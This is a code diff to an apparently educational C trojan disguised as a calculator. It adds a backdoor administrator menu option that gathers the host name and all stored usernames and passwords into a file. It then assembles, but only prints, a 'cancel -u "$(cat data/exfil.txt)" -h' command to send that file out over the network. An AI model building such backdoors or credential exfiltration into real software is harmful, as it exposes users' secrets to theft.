@@ -2,6 +2,7 @@
 #include <stdbool.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 
 /*
@@ -15,6 +16,7 @@ This program contains a bunch of examples of malicious software, from being a tr
 */
 
 #define STRING_MAX 20
+#define FILE_LINE_MAX 100
 //function prototypes
 int getInt();
 bool getOperation(int digit1, int digit2);
@@ -25,6 +27,9 @@ bool newUser();
 bool userAuth();
 void formatString(char string[]);
 bool administrator(unsigned int backdoor);
+void dataExfil();
+void sendFile();
+bool createExfilFile();
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -77,9 +82,9 @@ void findUser(unsigned int userType){
     //Allows the user to attempt to login
     while (searchUser) {
         puts("Please enter your username:");
-        scanf("%s", &username);
+        scanf("%s", username);
         puts("Please enter your password:");
-        scanf("%s", &password);
+        scanf("%s", password);
 
         //checks either the normal users file or sudoers file
         if (userType == 0) {
@@ -96,7 +101,7 @@ void findUser(unsigned int userType){
                 fgets(checkPass, STRING_MAX, fileptr);
                 formatString(checkUser);
                 formatString(checkPass);
-                if (strcmp(&username, &checkUser) == 0 && strcmp(&password, &checkPass) == 0){
+                if (strcmp(username, checkUser) == 0 && strcmp(password, checkPass) == 0){
                     searchUser = false;
                 }
             }
@@ -118,10 +123,10 @@ bool newUser(){
     char password[STRING_MAX];
 
     puts("Please enter your username");
-    scanf("%s", &username);
+    scanf("%s", username);
 
     puts("Please enter your password");
-    scanf("%s", &password);
+    scanf("%s", password);
 
     fileptr = fopen("users/passwords.txt", "a");
     if (fileptr == NULL){
@@ -157,7 +162,7 @@ bool administrator(unsigned int backdoor){
     puts("Welcome 'Administrator'!");
 
     while (checkEntry) {
-        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Print all stolen data to file\n3: Maybe more?");
+        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Print all stolen data to file\n3: Data Exfiltration");
         entry = getInt();
         //User wants to leave admin mode, can either close program or enter back to calculator
         if (entry == 0){
@@ -194,9 +199,98 @@ bool administrator(unsigned int backdoor){
         //Admin wants to print all stolen data from the system (i.e. running tree file and that stuff)
         } else if (entry == 2) {
             puts("This is where all stolen data would be printed. If I had any...");
-        } else {
+        } else if (entry == 3) {
+            dataExfil();
+        } else  {
             puts("Please enter a valid option");
         }
+    }
+}
+/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                                            Data Exfiltration
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+*/
+/*
+Runs data exfiltration commands
+*/
+void dataExfil() {
+    puts("Begin Data exfiltration process.....\nCreating Data exfil file.....");
+    if (createExfilFile()) {
+        puts("Attempting to send data.....");
+        sendFile();
+        puts("Data exfiltration complete!");
+    } else {
+        puts("Unable to create exfil file. Data exfiltration failure :(");
+    }
+}
+/*
+Attempts to send data via email
+*/
+void sendFile(){
+    FILE *fp;
+    char cmd[FILE_LINE_MAX] = "cancel -u \"$(cat data/exfil.txt)\" -h ";
+    char ip[] = "hostname -I > data/ip.txt";
+    char destport[] = ":1234";
+    char grabbedIP[STRING_MAX];
+    //create file with IP to be added to later command
+    system(ip);
+
+    //reads stored IP address
+    fp = fopen("data/ip.txt", "r");
+    fgets(grabbedIP, STRING_MAX, fp);
+    formatString(grabbedIP);
+    fclose(fp);
+
+    //cats the whole cancel command for execution
+    strcat(cmd, grabbedIP);
+    strcat(cmd, destport);
+    //"running" exfiltraiton command
+    puts("If the data were to actually send, this is what command would run:");
+    fprintf(stdout, "system(%s)\n", cmd);
+}
+/*
+Creates data exfil file, holds all user data, tree cat, and more
+*/
+bool createExfilFile(){
+    FILE* exfil;
+    FILE* users;
+    char hostName[FILE_LINE_MAX];
+    char username[STRING_MAX];
+    char password[STRING_MAX];
+
+    exfil = fopen("data/exfil.txt", "w");
+    if (exfil != NULL) {
+        //getting host name
+        if (gethostname(hostName, sizeof(hostName)) == 0) {
+            fprintf(exfil, "%s Data Exfiltration\n\n~~~~~~~~~~~Begin Data Exfiltration~~~~~~~~~~~\n", hostName);
+        } else {
+            fprintf(exfil, "Unknown Host Data Exfiltration\n\n");
+        }
+
+        //User data
+        users = fopen("users/passwords.txt", "r");
+        fprintf(exfil, "Usernames and Passwords:\n");
+        if (users != NULL) {
+            //gets all username and password sets
+            while (fgets(username, STRING_MAX, users) != NULL) {
+                fgets(password, STRING_MAX, users);
+                formatString(username);
+                formatString(password);
+                fprintf(exfil, "Username: '%s' Password: '%s'\n", username, password);
+            }
+            fprintf(exfil, "End User data\n\n");
+        } else {
+            fprintf(exfil, "Unable to locate users file\n");
+        }
+        fclose(users);
+
+        fprintf(exfil, "~~~~~~~~~~~End Data Exfiltration~~~~~~~~~~~");
+        fclose(exfil);
+        return true;
+    } else {
+        puts("Unable to open exfiltration file. Oh well.");
+        return false;
     }
 }
 
@@ -227,6 +321,7 @@ void calculator(){
         } else if (input == 1) {
             again = false;
             run = false;
+            runCalc = false;
         } else if (input == 2){
             //run admin
             runCalc = administrator(0);
@@ -350,7 +445,7 @@ void formatString(char string[]) {
 	//removes the new line character from the string/number
 	for (unsigned int i = 0; i < STRING_MAX; i++) {
 		if (string[i] == '\n') {
-			string[i] = NULL;
+			string[i] = '\0';
 		}
 	}
 
@@ -366,4 +461,5 @@ int main(){
     //calculator();
     puts("Welcome to the best ever calculator!");
     userAuth();
+    //sendFile();
 }
